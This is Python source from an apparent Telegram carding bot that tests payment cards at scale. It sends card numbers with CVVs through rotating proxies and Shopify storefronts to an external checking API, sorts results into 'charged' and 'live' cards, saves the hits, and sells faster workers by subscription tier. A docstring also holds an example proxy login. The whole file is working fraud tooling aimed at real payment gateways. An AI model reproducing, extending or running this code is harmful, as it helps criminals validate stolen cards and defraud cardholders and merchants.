async def debug_reply_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Debug command to check reply message structure - /debugreply
    """
    message = update.effective_message
    
    if not message.reply_to_message:
        await message.reply_text(
            "❌ This command must be used as a reply to a message.\n\n"
            "Reply to any message with /debugreply to see its structure."
        )
        return
    
    replied = message.reply_to_message
    
    # Build debug info
    info = f"📊 <b>Replied Message Debug Info</b>\n\n"
    info += f"🆔 Message ID: <code>{replied.message_id}</code>\n"
    info += f"📝 Message Type: <code>{type(replied).__name__}</code>\n"
    info += f"━━━━━━━━━━━━━━━━━━━\n"
    info += f"📷 Has Photo: <code>{replied.photo is not None}</code>\n"
    info += f"🎥 Has Video: <code>{replied.video is not None}</code>\n"
    info += f"📁 Has Document: <code>{replied.document is not None}</code>\n"
    info += f"🎬 Has Animation: <code>{replied.animation is not None}</code>\n"
    info += f"🖼️ Has Sticker: <code>{replied.sticker is not None}</code>\n"
    info += f"📝 Has Text: <code>{replied.text is not None}</code>\n"
    info += f"📝 Has Caption: <code>{replied.caption is not None}</code>\n"
    info += f"━━━━━━━━━━━━━━━━━━━\n"
    
    # Show content preview
    if replied.text:
        text_preview = replied.text[:200]
        if len(replied.text) > 200:
            text_preview += "..."
        info += f"📝 Text Preview:\n<code>{text_preview}</code>\n\n"
    
    if replied.caption:
        caption_preview = replied.caption[:200]
        if len(replied.caption) > 200:
            caption_preview += "..."
        info += f"📝 Caption Preview:\n<code>{caption_preview}</code>\n\n"
    
    # Show file info if available
    if replied.document:
        info += f"📎 File Name: <code>{replied.document.file_name}</code>\n"
        info += f"📦 File Size: <code>{replied.document.file_size} bytes</code>\n\n"
    
    if replied.photo:
        info += f"📷 Photo Sizes: {len(replied.photo)} available\n"
        info += f"   Largest: {replied.photo[-1].width}x{replied.photo[-1].height}\n\n"
    
    # Show user info
    if replied.from_user:
        info += f"👤 Sent By: <code>{replied.from_user.first_name}</code>\n"
        if replied.from_user.username:
            info += f"   Username: @{replied.from_user.username}\n"
        info += f"   User ID: <code>{replied.from_user.id}</code>\n"
    
    info += f"━━━━━━━━━━━━━━━━━━━\n"
    info += f"💡 <b>Hint:</b> Use /fb to send feedback with this media"
    
    await message.reply_text(info, parse_mode=ParseMode.HTML)
# ============ QUICK COMMANDS HANDLER ============
async def quick_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle quick commands (/, /pp, /ch, etc.)"""
    if not await verify_group_access(update, context):
        return
    
    text = update.message.text[1:]
    success, cmd, data = quick_cmd_manager.parse(text)
    
    if not success:
        return False
    
    user_id = update.effective_user.id
    
    if cmd == 'help':
        await update.message.reply_text(quick_cmd_manager.get_help(), parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'pp':
        context.user_data['gateway'] = 'paypal'
        await update.message.reply_text("✅ Switched to <b>PayPal</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'sp':
        if not user_manager.can_access_gateway(user_id, 'shopify'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return True
        context.user_data['gateway'] = 'shopify'
        await update.message.reply_text("✅ Switched to <b>Shopify</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'rz':
        if not user_manager.can_access_gateway(user_id, 'razorpay'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return True
        context.user_data['gateway'] = 'razorpay'
        await update.message.reply_text("✅ Switched to <b>Razorpay</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'st':
        context.user_data['gateway'] = 'stripe_charge'
        await update.message.reply_text("✅ Switched to <b>Stripe Charge</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'sta':
        context.user_data['gateway'] = 'stripe_auth'
        await update.message.reply_text("✅ Switched to <b>Stripe Auth</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'bt':
        if not user_manager.can_access_gateway(user_id, 'braintree'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return True
        context.user_data['gateway'] = 'braintree'
        await update.message.reply_text("✅ Switched to <b>Braintree</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'au':
        if not user_manager.can_access_gateway(user_id, 'autosopi'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return True
        context.user_data['gateway'] = 'autosopi'
        await update.message.reply_text("✅ Switched to <b>Autosopi</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'pf':
        if not user_manager.can_access_gateway(user_id, 'payflow'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return True
        context.user_data['gateway'] = 'payflow'
        await update.message.reply_text("✅ Switched to <b>Payflow</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'ch' and 'args' in data:
        try:
            amount = float(data['args'])
            if amount < 0.50 or amount > 1000:
                await update.message.reply_text("❌ Amount must be between $0.50 and $1000")
                return True
            context.user_data['payment_amount'] = f"{amount:.2f}"
            await update.message.reply_text(f"✅ Amount set to <b>${amount:.2f}</b>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Invalid amount. Use: /ch 2.99")
        return True
    
    elif cmd == 'px':
        args = data.get('args', '')
        if args == 'list':
            await proxy_command(update, context)
        elif args == 'test':
            await proxy_test_command(update, context)
        else:
            await update.message.reply_text(
                "🔄 <b>Proxy Quick Commands:</b>\n"
                "/px list - Show proxy list\n"
                "/px test - Test proxies",
                parse_mode=ParseMode.HTML
            )
        return True
    
    elif cmd == 'lb':
        period = data.get('args', 'daily')
        leaderboard_text = leaderboard.get_top_users(period)
        await update.message.reply_text(leaderboard_text, parse_mode=ParseMode.HTML, reply_markup=back_menu())
        return True
    
    elif cmd == 'rec':
        await recover_command(update, context)
        return True
    
    return False


# ============ NEW SHOPIFY MASS CHECK GATEWAY ============

async def check_card_shopify_mass(card: str, site: str, proxy: str = None, user_id: int = None, retry_count: int = 0) -> Dict:
    """
    Check card using Shopify Mass API
    API format: http://108.165.12.183:8081/?cc=CARD&url=SITE&proxy=PROXY
    FIXED: Proper JSON parsing without double-consuming response body
    """
    print(f"\n{'='*80}")
    print(f"💳 [SHOPIFY MASS API] Checking card: {card[:20]}...")
    print(f"📍 Site: {site}")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    print(f"{'='*80}")
    
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "price": "0.00",
        "gateway": "Shopify Payments"
    }
    
    try:
        # Parse card
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        card_num, month, year, cvv = parts
        
        # Format year to 2 digits for API
        if len(year) == 4:
            year_2digit = year[2:]
        else:
            year_2digit = year
        
        formatted_card = f"{card_num}|{month}|{year_2digit}|{cvv}"
        
        # Format site URL - remove http:// or https:// for API
        site_clean = site.replace('http://', '').replace('https://', '')
        if site_clean.endswith('/'):
            site_clean = site_clean[:-1]
        
        # Build URL with parameters (root endpoint, not /check)
        params = {
            "cc": formatted_card,
            "url": site_clean
        }
        
        # Format proxy for this API (host:port:user:pass format)
        proxy_param = None
        if proxy:
            proxy_param = format_proxy_for_shopify_mass(proxy)
            if proxy_param:
                params["proxy"] = proxy_param
                print(f"🔧 Using proxy param: {proxy_param[:50]}...")
        
        start_time = time.time()
        timeout_seconds = 45.0 if retry_count == 0 else 60.0
        
        # Use the correct endpoint (root, not /check)
        api_url = SHOPIFY_MASS_API_ENDPOINT
        
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(timeout_seconds, connect=15.0, read=timeout_seconds - 10),
            verify=False,
            limits=httpx.Limits(max_keepalive_connections=5, max_connections=10)
        ) as client:
            response = await client.get(
                api_url,
                params=params,
                headers={
                    "User-Agent": generate_user_agent(),
                    "Accept": "application/json",
                    "Connection": "close"
                },
                follow_redirects=True
            )
        
        elapsed = time.time() - start_time
        print(f"📥 Response time: {elapsed:.2f}s | Status: {response.status_code}")
        
        if response.status_code == 200:
            # ============ FIXED: Parse JSON directly FIRST ============
            try:
                data = response.json()
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                raw_preview = response.text[:300] if response.text else "[Empty Response]"
                print(f"📄 Raw response preview: {raw_preview}")
                
                if retry_count < 1:
                    await asyncio.sleep(2)
                    return await check_card_shopify_mass(card, site, proxy, user_id, retry_count + 1)
                default_result["message"] = "Invalid JSON response from API"
                default_result["elapsed"] = elapsed
                return default_result
            
            print(f"✅ MSH Response: {json.dumps(data, indent=2)[:500]}")
            
            # Extract response data
            response_text = data.get("Response", data.get("response", data.get("message", data.get("status", "UNKNOWN"))))
            gateway = data.get("Gate", data.get("gateway", data.get("Gateway", "Shopify Payments")))
            price = data.get("Price", data.get("price", data.get("amount", "0.00")))
            charged = data.get("Charged", data.get("charged", "False"))
            approved = data.get("Approved", data.get("approved", "False"))
            
            response_upper = response_text.upper()
            
            # ============ DECLINE PATTERNS - MARK AS DECLINED ============
            decline_patterns = [
                "PAYMENTS_METHOD",
                "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
                "CARD_DECLINED",
                "DECLINED",
                "REJECTED",
                "DO NOT HONOR",
                "GENERIC_ERROR",
                "INVALID CARD",
                "EXPIRED CARD",
                "LOST CARD",
                "STOLEN CARD",
                "RESTRICTED_CARD",
                "PICKUP_CARD",
                "INCORRECT_NUMBER",
                "NO SUCH NUMBER",
                "INVALID NUMBER",
                "PAYMENTS_NOT_SUPPORTED",
                "PAYMENTS_CARD_ERROR",
                "PAYMENT_METHOD_NOT_ACCEPTED",
                "NO VARIANTS",
                "NO_PRODUCT",
                "PRODUCT_NOT_FOUND",
                "CART_EMPTY",
                "CHECKOUT_ERROR",
                "VALIDATION_ERROR",
                "GENERIC_ERROR",
            ]
            
            # ============ SITE REMOVAL ERRORS ============
            for removal_error in SITE_REMOVAL_ERRORS:
                if removal_error.upper() in response_upper:
                    print(f"🗑️ [MSH] SITE REMOVAL: {removal_error} for site {site_clean}")
                    return {
                        "status": "error",
                        "result": removal_error,
                        "message": response_text,
                        "status_display": f"⚠️ SITE REMOVED: {removal_error}",
                        "status_category": "error",
                        "elapsed": elapsed,
                        "price": "0.00",
                        "gateway": gateway,
                        "site_removed": True
                    }
            
            # Check if this is a decline response
            is_decline = any(pattern in response_upper for pattern in decline_patterns)
            
            # Check for actual charged (only these are true positives)
            charged_patterns = [
                "CHARGED", "ORDER COMPLETED", "ORDER COMPLETED 💎", "TRANSACTION_COMPLETED", "ORDER_PLACED",
                "CHARGE_SUCCESSFUL", "PAYMENT_SUCCESSFUL"
            ]
            is_charged = any(pattern in response_upper for pattern in charged_patterns)
            
            # Check for 3D/OTP (these are live but need authentication)
            otp_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS", "THREEDS"]
            is_3d = any(pattern in response_upper for pattern in otp_patterns)
            
            # Check for insufficient funds (live but no money)
            insufficient_patterns = ["INSUFFICIENT", "FUNDS", "INSUFFICIENT_FUNDS"]
            is_insufficient = any(pattern in response_upper for pattern in insufficient_patterns)
            
            # Check for CVV live
            cvv_patterns = ["CVV LIVE", "INCORRECT_CVV", "CVV_MISMATCH"]
            is_cvv_live = any(pattern in response_upper for pattern in cvv_patterns)
            
            # ============ DETERMINE STATUS ============
            if is_charged:
                status_display = "🔥 CHARGED 🔥"
                status_category = "charged"
                print(f"🔥 CHARGED: {response_text}")
            elif is_3d:
                status_display = "🔐 3D REQUIRED"
                status_category = "approved"
                print(f"🔐 3D REQUIRED: {response_text}")
            elif is_insufficient:
                status_display = "💰 INSUFFICIENT FUNDS"
                status_category = "approved"
                print(f"💰 INSUFFICIENT FUNDS: {response_text}")
            elif is_cvv_live:
                status_display = "✅ CVV LIVE"
                status_category = "approved"
                print(f"✅ CVV LIVE: {response_text}")
            elif is_decline:
                status_display = "❌ DECLINED"
                status_category = "declined"
                print(f"❌ DECLINED: {response_text}")
            else:
                # Default to declined for unknown responses
                status_display = "❌ DECLINED"
                status_category = "declined"
                print(f"❌ UNKNOWN - treating as DECLINED: {response_text}")
            
            # Format price - remove currency symbol if present
            try:
                # Handle price like "$6.55 USD" or "$7.57 GBP"
                price_clean = price.replace('USD', '').replace('GBP', '').replace('EUR', '').strip()
                price_float = float(price_clean)
                price_str = f"${price_float:.2f}"
            except:
                price_str = str(price) if price and price != "?" else "$0.00"
            
            return {
                "status": "success" if status_category in ["charged", "approved"] else "declined",
                "result": response_text,
                "message": response_text,
                "status_display": status_display,
                "status_category": status_category,
                "elapsed": elapsed,
                "price": price_str,
                "gateway": gateway,
                "site": site_clean,
                "proxy_used": proxy
            }
            
        else:
            print(f"⚠️ HTTP error: {response.status_code}")
            if response.status_code in [408, 429, 500, 502, 503, 504] and retry_count < 1:
                await asyncio.sleep(2)
                return await check_card_shopify_mass(card, site, proxy, user_id, retry_count + 1)
            default_result["message"] = f"HTTP Error: {response.status_code}"
            return default_result
            
    except httpx.TimeoutException:
        print(f"⏰ Timeout error")
        if retry_count < 1:
            await asyncio.sleep(2)
            return await check_card_shopify_mass(card, site, proxy, user_id, retry_count + 1)
        default_result["message"] = "Request timeout"
        return default_result
    except Exception as e:
        print(f"❌ MSH Error: {e}")
        default_result["message"] = str(e)[:100]
        return default_result
    


def get_next_working_msh_site(exclude_site: str = None) -> Optional[str]:
    """Get next working site for MSH API from Autosopi pool"""
    working_sites = get_working_msh_sites()
    
    if not working_sites:
        return None
    
    # Rotate through working sites
    if not hasattr(get_next_working_msh_site, 'index'):
        get_next_working_msh_site.index = 0
    
    # Find a site not excluded
    for _ in range(len(working_sites) * 2):
        site = working_sites[get_next_working_msh_site.index % len(working_sites)]
        get_next_working_msh_site.index += 1
        if site != exclude_site:
            return site
    
    return working_sites[0] if working_sites else None



def format_proxy_for_shopify_mass(proxy: str) -> Optional[str]:
    """
    Format proxy for Shopify Mass API
    Expected format: host:port:user:pass
    Example: px023005.pointtoserver.com:10780:purevpn0s13918563:fV21iqc3trwCAs
    
    Handles all input formats and converts to host:port:user:pass
    """
    if not proxy:
        return None
    
    original_proxy = proxy
    
    try:
        # Remove any protocol prefixes
        proxy = re.sub(r'^(http|https|socks4|socks5)://', '', proxy)
        
        # ============ Format: host:port:user:pass (already correct) ============
        parts = proxy.split(':')
        if len(parts) == 4:
            # Check if second part is numeric (port) -> host:port:user:pass
            if parts[1].isdigit():
                print(f"✅ [Shopify Mass Proxy] Using as-is: {proxy[:50]}...")
                return proxy
            # Format: user:pass:host:port - needs conversion
            elif parts[3].isdigit():
                user, password, host, port = parts
                result = f"{host}:{port}:{user}:{password}"
                print(f"✅ [Shopify Mass Proxy] Converted user:pass:host:port -> {result[:50]}...")
                return result
        
        # ============ Format: user:pass@host:port ============
        if '@' in proxy:
            auth, hostport = proxy.split('@', 1)
            if ':' in auth and ':' in hostport:
                user, password = auth.split(':', 1)
                host, port = hostport.split(':', 1)
                result = f"{host}:{port}:{user}:{password}"
                print(f"✅ [Shopify Mass Proxy] Converted @ format -> {result[:50]}...")
                return result
        
        # ============ Format: host:port only (no authentication) ============
        if len(parts) == 2 and parts[1].isdigit():
            print(f"⚠️ [Shopify Mass Proxy] Proxy without auth: {proxy}")
            return proxy
        
        # ============ Try regex extraction ============
        match = re.search(r'([a-zA-Z0-9\.-]+):(\d+):([a-zA-Z0-9]+):([a-zA-Z0-9]+)', proxy)
        if match:
            host, port, user, password = match.groups()
            result = f"{host}:{port}:{user}:{password}"
            print(f"✅ [Shopify Mass Proxy] Extracted via regex -> {result[:50]}...")
            return result
        
        print(f"⚠️ [Shopify Mass Proxy] Could not parse: {original_proxy[:50]}...")
        return None
        
    except Exception as e:
        print(f"⚠️ [Shopify Mass Proxy] Error parsing: {e}")
        return None

def format_shopify_mass_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Shopify Mass API response with PREMIUM EMOJIS"""
    bin_info_text, bank, country, currency_code, country_code = bin_info
    
    status_display = result.get("status_display", "⚠️ UNKNOWN")
    status_category = result.get("status_category", "unknown")
    response_msg = result.get("message", "Unknown")
    price = result.get("price", "0.00")
    elapsed = result.get("elapsed", 0)
    gateway = result.get("gateway", "Shopify Payments")
    proxy_used = result.get("proxy_used", "None")
    
    proxy_display = mask_proxy(proxy_used) if proxy_used and proxy_used != "None" else "None"
    
    try:
        price_float = float(price)
        price_str = f"${price_float:.2f}"
    except:
        price_str = f"${price}"
    
    response_upper = response_msg.upper()
    
    # ============ CHECK FOR GENERIC_ERROR AND OTHER DECLINES FIRST ============
    decline_patterns = [
        "GENERIC_ERROR", "CARD_DECLINED", "DECLINED", "DO NOT HONOR",
        "EXPIRED CARD", "LOST CARD", "STOLEN CARD", "RESTRICTED CARD",
        "PAYMENTS_METHOD", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
        "INVALID CARD", "REJECTED", "NOT_ACCEPTED", "RISK_DISALLOWED"
    ]
    
    # Check for declines FIRST
    is_decline = any(pattern in response_upper for pattern in decline_patterns)
    
    if is_decline:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
        status_display_clean = "DECLINED"
        status_category_fixed = "declined"
    # Check for OTP/3D
    elif any(p in response_upper for p in ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS", "THREEDS", "OTP_REQUIRED", "3D_SECURE"]):
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
        status_display_clean = "3D REQUIRED"
        status_category_fixed = "approved"
    # Check for CHARGED
    elif any(p in response_upper for p in ["CHARGED", "ORDER COMPLETED", "PAID", "SUCCESS", "CAPTURED", "ORDER_PLACED",]):
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
        status_display_clean = "CHARGED"
        status_category_fixed = "charged"
    # Check for INSUFFICIENT FUNDS
    elif "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
        status_display_clean = "INSUFFICIENT FUNDS"
        status_category_fixed = "approved"
    # Check for CVV LIVE
    elif "CVV LIVE" in response_upper or "INCORRECT_CVV" in response_upper:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
        status_display_clean = "CVV LIVE"
        status_category_fixed = "approved"
    # Then check based on result status_category
    elif status_category == "charged":
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
        status_display_clean = "CHARGED"
        status_category_fixed = "charged"
    elif status_category == "approved":
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
        status_display_clean = "APPROVED"
        status_category_fixed = "approved"
    else:
        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
        status_display_clean = "DECLINED"
        status_category_fixed = "declined"
    
    ui = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status_emoji} {status_display_clean}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price_str}\n"
        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country}\n"
        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
    )
    
    return ui, status_category_fixed


        
# ============ MSH (SHOPIFY) WORKER CONFIGURATION ============
MSH_WORKER_CONFIG = {
    "free": {"workers": 1, "delay": 2.0, "concurrency": 1},
    "premium": {"workers": 1, "delay": 1.5, "concurrency": 1},
    "ultimate": {"workers": 5, "delay": 1.0, "concurrency": 1},
    "admin": {"workers": 5, "delay": 0.8, "concurrency": 1}
}



# ============ MSH WORKER MODE FOR MASS CHECKS ============

async def msh_worker_check_card(card: str, amount: str, currency: str, proxy: str = None, user_id: int = None, worker_id: int = None) -> Dict:
    """
    Individual card check for MSH worker mode
    Each worker handles its own checkout independently
    """
    print(f"\n{'='*60}")
    print(f"👷 [WORKER #{worker_id}] Processing card: {card[:20]}...")
    if proxy:
        print(f"🔌 [WORKER #{worker_id}] Using proxy: {mask_proxy(proxy)}")
    print(f"{'='*60}")
    
    try:
        # Parse card
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format",
                "status_display": "⚠️ INVALID",
                "status_category": "error",
                "worker_id": worker_id
            }
        
        card_num, card_mm, card_yy, card_cvv = parts
        
        # Format year
        if len(card_yy) == 4:
            card_yy = card_yy[2:]
        
        start_time = time.time()
        
        # Get proxy if allowed
        proxy_str = None
        if proxy:
            proxy_str = proxy
        
        # Use PayPal API internally (same as /sh)
        result = await check_card_paypal(card, amount, currency, proxy_str, user_id)
        
        elapsed = time.time() - start_time
        
        if result:
            response_text = result.get("message", "UNKNOWN")
            status_category = result.get("status_category", "unknown")
            result_status = result.get("result", "")
            result_code = result.get("code", "")
            
            response_upper = response_text.upper()
            code_upper = result_code.upper()
            
            # ============ UPDATED: Map ALL working responses to CHARGED ============
            # These all indicate the card is valid/working - should show as CHARGED
            charged_patterns = [
                "CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID", "COMPLETED", "ORDER_PLACED",
            ]
            
            # 3D/OTP patterns (still show as 3D REQUIRED)
            otp_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS", "THREEDS"]
            
            # Check if it's a CHARGED/APPROVED response
            is_charged = any(p in response_upper for p in charged_patterns) or any(p in code_upper for p in charged_patterns)
            
            # Check if it's 3D/OTP required
            is_otp = any(p in response_upper for p in otp_patterns)
            
            # Check for specific response codes
            if result_code and result_code.upper() == "RISK_DISALLOWED":
                is_charged = True
                print(f"🎯 [WORKER #{worker_id}] RISK_DISALLOWED detected - Card is LIVE! Treating as CHARGED")
            
            if result_code and result_code.upper() == "EXISTING_ACCOUNT_RESTRICTED":
                is_charged = True
                print(f"🎯 [WORKER #{worker_id}] EXISTING_ACCOUNT_RESTRICTED detected - Card is LIVE! Treating as CHARGED")
            
            # Check for insufficient funds (still a live card)
            if "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                is_charged = True
                print(f"💰 [WORKER #{worker_id}] INSUFFICIENT FUNDS - Card is live but has no balance")
            
            if is_charged:
                # All working cards show as CHARGED with Shopify format
                status_display = "🔥 CHARGED 🔥"
                status_category_final = "charged"
                if "RISK_DISALLOWED" in response_upper or "RISK_DISALLOWED" in code_upper:
                    response_msg = "RISK_DISALLOWED - Card is valid (risk flagged)"
                elif "EXISTING_ACCOUNT_RESTRICTED" in response_upper or "EXISTING_ACCOUNT_RESTRICTED" in code_upper:
                    response_msg = "EXISTING_ACCOUNT_RESTRICTED - Card is LIVE"
                elif "INSUFFICIENT" in response_upper or "FUNDS" in response_upper:
                    response_msg = "INSUFFICIENT FUNDS - Card has balance issue"
                else:
                    response_msg = "Order completed 💎"
                print(f"🔥 [WORKER #{worker_id}] CHARGED: {card[:20]}...")
                
            elif is_otp:
                status_display = "🔐 3D REQUIRED"
                status_category_final = "approved"
                response_msg = "3D Secure required - Authentication needed"
                print(f"🔐 [WORKER #{worker_id}] 3D REQUIRED: {card[:20]}...")
                
            else:
                status_display = "❌ DECLINED"
                status_category_final = "declined"
                response_msg = "CARD DECLINED"
                print(f"❌ [WORKER #{worker_id}] DECLINED: {card[:20]}...")
            
            return {
                "status": "success" if status_category_final in ["charged", "approved"] else "declined",
                "result": status_display,
                "message": response_msg,
                "raw_response": response_text,
                "status_display": status_display,
                "status_category": status_category_final,
                "elapsed": elapsed,
                "price": f"${amount}",
                "gateway": "Shopify Payments",
                "proxy_used": proxy_str,
                "worker_id": worker_id,
                "code": result_code
            }
        else:
            print(f"❌ [WORKER #{worker_id}] No response from API")
            return {
                "status": "error",
                "result": "ERROR",
                "message": "No response from API",
                "status_display": "⚠️ ERROR",
                "status_category": "error",
                "elapsed": elapsed,
                "worker_id": worker_id
            }
            
    except Exception as e:
        print(f"❌ [WORKER #{worker_id}] Error: {e}")
        return {
            "status": "error",
            "result": "ERROR",
            "message": str(e)[:100],
            "status_display": "⚠️ ERROR",
            "status_category": "error",
            "worker_id": worker_id
        }


async def msh_single_worker(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                            card_queue: asyncio.Queue, worker_id: int, 
                            stats: dict, results_lock: asyncio.Lock,
                            user_id: int, progress_msg, total_cards: int):
    """Single worker - gets a NEW proxy for EACH card"""
    message = update.effective_message
    proxy_index = 0  # Local proxy rotation index for this worker
    
    while True:
        try:
            card = await asyncio.wait_for(card_queue.get(), timeout=1.0)
        except asyncio.TimeoutError:
            break
        
        try:
            # ============ GET SITE FROM AUTOSOPI MANAGER ============
            site = None
            tried_sites = []
            
            for _ in range(20):  # Try up to 20 times
                test_site = autosopi_site_manager.get_next_site_weighted()
                if not test_site:
                    break
                
                if test_site in tried_sites:
                    continue
                
                tried_sites.append(test_site)
                
                # Format site properly for MSH API (remove http://, keep https:// in params)
                if test_site.startswith(('http://', 'https://')):
                    formatted_site = test_site.replace('http://', '').replace('https://', '')
                else:
                    formatted_site = test_site
                
                print(f"🔄 [WORKER #{worker_id}] Trying site: {formatted_site}")
                site = formatted_site
                break
            
            if not site:
                print(f"⚠️ [WORKER #{worker_id}] No sites available after trying {len(tried_sites)} sites")
                async with results_lock:
                    stats["errors"] += 1
                    stats["processed"] += 1
                card_queue.task_done()
                continue
            
            # ============ GET A NEW PROXY FOR EACH CARD ============
            proxy_str = None
            if user_manager.can_use_proxy(user_id):
                # Get proxies from user's pool
                user_proxies = proxy_manager.user_proxies.get(user_id, [])
                if user_proxies:
                    # Use local index for round-robin rotation
                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
                    proxy_index += 1
                    print(f"🔄 [WORKER #{worker_id}] Using proxy #{proxy_index}: {mask_proxy(proxy_str)}")
                else:
                    print(f"⚠️ [WORKER #{worker_id}] No proxies available for user {user_id}")
            
            # Format proxy for Shopify Mass API
            formatted_proxy = None
            if proxy_str:
                formatted_proxy = format_proxy_for_shopify_mass(proxy_str)
                if formatted_proxy:
                    print(f"🔧 [WORKER #{worker_id}] Formatted proxy: {formatted_proxy[:50]}...")
                else:
                    print(f"⚠️ [WORKER #{worker_id}] Could not format proxy, trying without proxy")
            
            print(f"🔍 [WORKER #{worker_id}] Checking card with site: {site}, proxy: {mask_proxy(proxy_str) if proxy_str else 'None'}")
            
            # Check card using the fixed MSH API
            result = await check_card_shopify_mass(card, site, formatted_proxy, user_id, retry_count=0)
            
            # Get BIN info
            bin_info = await get_bin_info(card)
            bin_info_text, bank, country, _, _ = bin_info
            
            # Check if site was removed
            if result and result.get("site_removed", False):
                print(f"🗑️ [WORKER #{worker_id}] Site {site} was removed due to error")
                card_queue.task_done()
                continue
            
            status_display = result.get("status_display", "❌ DECLINED")
            status_category = result.get("status_category", "declined")
            response_msg = result.get("message", "CARD DECLINED")
            price_str = result.get("price", "$0.00")
            elapsed = result.get("elapsed", 0)
            gateway_from_response = result.get("gateway", "Shopify Payments")
            
            # Format country with flag
            country_name = country.replace('🌐', '').strip()
            import re
            country_name = re.sub(r'[🇺🇸🇬🇧🇨🇦🇦🇺🇮🇳🇦🇪🇹🇭]+', '', country_name).strip()
            
            flag_map = {'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦', 'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳'}
            country_flag = "🌍"
            for key, flag in flag_map.items():
                if key in country_name.upper():
                    country_flag = flag
                    break
            
            # Build output
            ui = (
                f"┏━━━━━━━⍟\n"
                f"┃ {status_display}\n"
                f"┗━━━━━━━━━━━⊛\n\n"
                f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card}</code>\n"
                f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway_from_response}\n"
                f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price_str}\n"
                f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {response_msg}\n"
                f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
                f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
                f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
            )
            
            async with results_lock:
                if status_category == "charged":
                    stats["charged"] += 1
                    await message.reply_text(ui, parse_mode=ParseMode.HTML)
                    
                    await save_hit_to_file(
                        card=card, gateway=gateway_from_response,
                        response=response_msg, price=price_str,
                        bin_info=bin_info, user_id=user_id,
                        user_tier=user_manager.get_tier(user_id)
                    )
                    
                    user_data = user_manager.get_user(user_id)
                    await send_hit_notification(
                        context=context, gateway=gateway_from_response,
                        card=card, response=response_msg, price=price_str,
                        user=user_data, bin_info=bin_info, status_category="charged"
                    )
                    user_manager.increment_hits(user_id)
                    
                elif status_category == "approved":
                    stats["approved"] += 1
                    await message.reply_text(ui, parse_mode=ParseMode.HTML)
                    
                    await save_hit_to_file(
                        card=card, gateway=gateway_from_response,
                        response=response_msg, price=price_str,
                        bin_info=bin_info, user_id=user_id,
                        user_tier=user_manager.get_tier(user_id)
                    )
